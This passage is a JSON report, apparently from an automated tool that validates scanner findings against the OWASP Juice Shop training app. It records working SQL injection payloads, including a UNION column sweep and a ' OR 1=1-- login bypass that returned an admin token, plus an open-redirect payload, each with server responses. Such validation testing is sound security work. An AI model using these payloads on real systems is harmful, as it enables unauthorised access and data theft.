@@ -1,0 +1,1633 @@
+{
+  "generated": "2026-08-17T15:56:49.371245+00:00",
+  "target": "http://juiceshop:3000",
+  "summary": {
+    "total": 34,
+    "confirmed": 3,
+    "false_positive": 23,
+    "inconclusive": 0,
+    "agent_failure": 0,
+    "skipped": 8,
+    "false_positive_rate": 0.885
+  },
+  "verdicts": [
+    {
+      "finding_id": "20019-1:0",
+      "vuln_class": "open_redirect",
+      "name": "External Redirect",
+      "verdict": "confirmed",
+      "reason": "open redirect via attack_scanner: Location -> 2877686882539975274.owasp.org",
+      "proof": [
+        {
+          "step": "baseline",
+          "request": {
+            "method": "GET",
+            "path": "/redirect",
+            "params": {
+              "to": "/account"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 406,
+            "location": null,
+            "body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: /account</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, "
+          }
+        },
+        {
+          "step": "attack_scanner",
+          "request": {
+            "method": "GET",
+            "path": "/redirect",
+            "params": {
+              "to": "https://2877686882539975274.owasp.org/?https://github.com/juice-shop/juice-shop"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 302,
+            "location": "https://2877686882539975274.owasp.org/?https://github.com/juice-shop/juice-shop",
+            "body_snippet": "Found. Redirecting to https://2877686882539975274.owasp.org/?https://github.com/juice-shop/juice-shop"
+          }
+        }
+      ],
+      "attempts": 1,
+      "elapsed_s": 0.66,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "attack_marker",
+              "payload": "to=https://oob-validator.example/"
+            },
+            {
+              "id": "attack_scanner",
+              "payload": "to=https://2877686882539975274.owasp.org/?https://github.com/juice-shop/juice-shop"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 406,
+              "len": 2510
+            },
+            "attack_marker": {
+              "status": 406,
+              "len": 2554
+            },
+            "attack_scanner": {
+              "status": 302,
+              "len": 101
+            }
+          },
+          "oracle": "open redirect via attack_scanner: Location -> 2877686882539975274.owasp.org",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "10028:0",
+      "vuln_class": "open_redirect",
+      "name": "Off-site Redirect",
+      "verdict": "false_positive",
+      "reason": "no off-site redirect produced; the parameter looks validated",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.44,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "attack_marker",
+              "payload": "to=https://oob-validator.example/"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 406,
+              "len": 2510
+            },
+            "attack_marker": {
+              "status": 406,
+              "len": 2554
+            }
+          },
+          "oracle": "no off-site redirect produced; the parameter looks validated",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40018:0",
+      "vuln_class": "sqli",
+      "name": "SQL Injection",
+      "verdict": "confirmed",
+      "reason": "UNION SQLi: injected marker appeared in the results",
+      "proof": [
+        {
+          "step": "baseline",
+          "request": {
+            "method": "GET",
+            "path": "/rest/products/search",
+            "params": {
+              "q": "zzq7nomatch"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "{\"status\":\"success\",\"data\":[]}"
+          }
+        },
+        {
+          "step": "sweep_qpp_9",
+          "request": {
+            "method": "GET",
+            "path": "/rest/products/search",
+            "params": {
+              "q": "zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "{\"status\":\"success\",\"data\":[{\"id\":\"sqlivalmark7\",\"name\":\"sqlivalmark7\",\"description\":\"sqlivalmark7\",\"price\":\"sqlivalmark7\",\"deluxePrice\":\"sqlivalmark7\",\"image\":\"sqlivalmark7\",\"createdAt\":\"sqlivalmark7\",\"updatedAt\":\"sqlivalmark7\",\"deletedAt\":\"sqlivalmark7\"}]}"
+          }
+        }
+      ],
+      "attempts": 2,
+      "elapsed_s": 6.61,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "attack_q1",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "attack_q3",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 30
+            },
+            "attack_q1": {
+              "status": 500,
+              "len": 982
+            },
+            "attack_q3": {
+              "status": 500,
+              "len": 982
+            }
+          },
+          "oracle": "server error on injection (breakout/column count wrong; needs a refined payload)",
+          "verdict": "unresolved"
+        },
+        {
+          "n": 1,
+          "kind": "diagnose",
+          "reasoning": "The initial attempted payloads used a single quote to break out, with and without multiple columns, but all resulted in a syntax error near 'UNION'. This strongly suggests that additional or different breakout sequences are required\u2014either more closing parentheses, different quote types, or both. The proper UNION breakout and column count have likely not yet been found. The next diagnostic step is to efficiently sweep candidate breakouts and column counts to discover a valid injection point\u2014with the marker repeated in every column\u2014since only one valid variant needs to succeed. This is most efficiently done with a sweep as prescribed in the briefing.",
+          "hypotheses": [
+            {
+              "cause": "Breakout sequence and/or column count is not correct for backend query structure or parenthesis context.",
+              "confidence": 0.9
+            },
+            {
+              "cause": "The backend uses double quotes instead of single quotes for strings, so single-quote breakouts fail but double-quote variants could succeed.",
+              "confidence": 0.6
+            },
+            {
+              "cause": "Backend parsing may require escaping or unexpected parentheses, so only specific variations could succeed, including over-closed parentheses.",
+              "confidence": 0.4
+            }
+          ],
+          "giveup": false
+        },
+        {
+          "n": 2,
+          "kind": "run",
+          "mode": "adaptive",
+          "steps": [
+            {
+              "id": "sweep_q_1",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_2",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_3",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_4",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_5",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_6",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_7",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_8",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_9",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_10",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_11",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_q_12",
+              "payload": "q=zzq7nomatch' UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_1",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_2",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_3",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_4",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_5",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_6",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_7",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_8",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_9",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_10",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_11",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qp_12",
+              "payload": "q=zzq7nomatch') UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_1",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_2",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_3",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_4",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_5",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_6",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_7",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_8",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_9",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_10",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_11",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_12",
+              "payload": "q=zzq7nomatch')) UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_1",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_2",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_3",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_4",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_5",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_6",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_7",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_8",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_9",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_10",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_11",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_d_12",
+              "payload": "q=zzq7nomatch\" UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_1",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_2",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_3",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_4",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_5",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_6",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_7",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_8",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_9",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_10",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_11",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_dp_12",
+              "payload": "q=zzq7nomatch\") UNION SELECT 'sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7','sqlivalmark7'-- -"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 30
+            },
+            "sweep_q_1": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_2": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_3": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_4": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_5": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_6": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_7": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_8": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_9": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_10": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_11": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_q_12": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_1": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_2": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_3": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_4": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_5": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_6": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_7": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_8": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_9": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_10": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_11": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qp_12": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_1": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_2": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_3": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_4": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_5": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_6": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_7": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_8": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_9": {
+              "status": 200,
+              "len": 258
+            },
+            "sweep_qpp_10": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_11": {
+              "status": 500,
+              "len": 1078
+            },
+            "sweep_qpp_12": {
+              "status": 500,
+              "len": 974
+            },
+            "sweep_d_1": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_2": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_3": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_4": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_5": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_6": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_7": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_8": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_9": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_10": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_11": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_d_12": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_1": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_2": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_3": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_4": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_5": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_6": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_7": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_8": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_9": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_10": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_11": {
+              "status": 500,
+              "len": 996
+            },
+            "sweep_dp_12": {
+              "status": 500,
+              "len": 996
+            }
+          },
+          "oracle": "UNION SQLi: injected marker appeared in the results",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "40018:1",
+      "vuln_class": "sqli",
+      "name": "SQL Injection",
+      "verdict": "confirmed",
+      "reason": "auth bypass: injection returned a token, normal logins did not",
+      "proof": [
+        {
+          "step": "baseline",
+          "request": {
+            "method": "POST",
+            "path": "/rest/user/login",
+            "params": null,
+            "json": {
+              "email": "nobody@validator.test",
+              "password": "wrong-pw"
+            },
+            "headers": null
+          },
+          "response": {
+            "status": 401,
+            "location": null,
+            "body_snippet": "Invalid email or password."
+          }
+        },
+        {
+          "step": "attack",
+          "request": {
+            "method": "POST",
+            "path": "/rest/user/login",
+            "params": null,
+            "json": {
+              "email": "' OR 1=1--",
+              "password": "x"
+            },
+            "headers": null
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3J"
+          }
+        },
+        {
+          "step": "control",
+          "request": {
+            "method": "POST",
+            "path": "/rest/user/login",
+            "params": null,
+            "json": {
+              "email": "zzz-not-a-user@validator.test",
+              "password": "x"
+            },
+            "headers": null
+          },
+          "response": {
+            "status": 401,
+            "location": null,
+            "body_snippet": "Invalid email or password."
+          }
+        }
+      ],
+      "attempts": 1,
+      "elapsed_s": 0.32,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "attack",
+              "payload": "{'email': \"' OR 1=1--\", 'password': 'x'}"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 401,
+              "len": 26
+            },
+            "attack": {
+              "status": 200,
+              "len": 784
+            },
+            "control": {
+              "status": 401,
+              "len": 26
+            }
+          },
+          "oracle": "auth bypass: injection returned a token, normal logins did not",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:0",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.3,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:1",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.36,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(2)"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:2",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.32,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(2)/juicy_malware_linux_amd_64.url"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:3",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.3,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(2)/juicy_malware_linux_arm_64.url"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:4",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
